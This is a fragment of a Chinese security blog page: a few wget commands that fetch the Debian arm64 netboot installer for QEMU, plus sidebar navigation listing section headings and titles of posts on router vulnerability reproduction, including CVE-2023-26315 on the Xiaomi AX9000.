debian-3607-aarch64.qcow2 32Gwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/initrd.gzwget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/linuxwget...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/Qhead.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">XiDP</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiDP0"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">So get away</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81"><span class="toc-number">2.</span> <span class="toc-text">漏洞概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E7%B3%BB%E7%BB%9F%E4%BB%BF%E7%9C%9F%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8AX9000"><span class="toc-number">3.</span> <span class="toc-text">qemu系统仿真小米路由器AX9000</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%8B%86%E8%A7%A3"><span class="toc-number">3.1.</span> <span class="toc-text">固件拆解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEqemu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C"><span class="toc-number">3.2.</span> <span class="toc-text">配置qemu虚拟机网络</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#patch%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.</span> <span class="toc-text">patch修改文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8scp%E4%BC%A0%E8%BE%93%E5%90%91qemu%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6"><span class="toc-number">3.4.</span> <span class="toc-text">使用scp传输向qemu虚拟机传输文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8httpd%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.5.</span> <span class="toc-text">启动httpd服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E7%94%A8%E7%9A%84%E9%83%A8%E5%88%86"><span class="toc-number">3.6.</span> <span class="toc-text">没用的部分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lua%E5%8F%8D%E6%B1%87%E7%BC%96%E5%92%8C%E5%88%86%E6%9E%90"><span class="toc-number">5.1.</span> <span class="toc-text">Lua反汇编和分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%88%86%E6%9E%90"><span class="toc-number">5.2.</span> <span class="toc-text">二进制文件内容分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="toc-number">5.2.1.</span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="toc-number">5.2.2.</span> <span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="toc-number">5.2.3.</span> <span class="toc-text">第三步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5"><span class="toc-number">5.2.4.</span> <span class="toc-text">第四步</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">6.</span> <span class="toc-text">最后</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/05/%E5%B0%8F%E7%B1%B3AX9000%E8%B7%AF%E7%94%B1%E5%99%A8CVE-2023-26315%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="小米AX9000路由器CVE-2023-26315漏洞复现">小米AX9000路由器CVE-2023-26315漏洞复现</a><time datetime="2025-11-04T16:00:00.000Z" title="发表于 2025-11-05 00:00:00">2025-11-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/qemu%E6%90%AD%E5%BB%BAARM64%E7%8E%AF%E5%A2%83/" title="qemu搭建ARM64环境">qemu搭建ARM64环境</a><time datetime="2025-07-13T16:00:00.000Z" title="发表于 2025-07-14 00:00:00">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/13/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="IOT入门--路由器命令执行漏洞">IOT入门--路由器命令执行漏洞</a><time datetime="2025-07-12T16:00:00.000Z" title="发表于 2025-07-13 00:00:00">2025-07-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-17215 华为HG532路由器RCE漏洞复现">CVE-2017-17215 华为HG532路由器RCE漏洞复现</a><time datetime="2025-07-11T16:00:00.000Z" title="发表于 2025-07-12 00:00:00">2025-07-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/" title="DIR-815 栈溢出漏洞(CNVD-2013-11625)复现">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</a><time datetime="2025-06-13T16:00:00.000Z" title="发表于 2025-06-14 00:00:00">2025-06-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/yu2.png);"><div id="footer-wrap"><div class="footer_custom_text">Let yourself go</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="(。・＿・。)ﾉ你好呀，希望博客里面的内容可以帮助到你" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>